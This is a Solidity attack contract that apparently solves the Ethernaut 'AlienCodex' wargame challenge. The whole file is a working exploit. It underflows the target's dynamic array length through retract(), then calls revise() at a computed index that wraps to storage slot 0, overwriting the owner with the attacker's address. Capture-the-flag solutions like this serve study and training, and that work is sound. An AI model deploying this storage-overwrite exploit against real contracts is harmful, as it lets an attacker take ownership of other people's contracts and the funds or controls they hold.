// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IAlienCodex.sol";

contract AlienCodexAttack {
    IAlienCodex public immutable victimAlienCodex;

    constructor(IAlienCodex victimAlienCodex_) {
        victimAlienCodex = victimAlienCodex_;
    }

    function attack() external {
        victimAlienCodex.make_contact();

        require(victimAlienCodex.contact(), "AlienCodex: Wrong res");

        victimAlienCodex.retract();

        victimAlienCodex.revise(
            type(uint256).max - uint256(keccak256(abi.encode(uint32(1)))) + 1,
            bytes32(bytes20(msg.sender)) >> 96
        );

        require(
            msg.sender == victimAlienCodex.owner(),
            "AlienCodex: Attack failed"
        );
    }
}
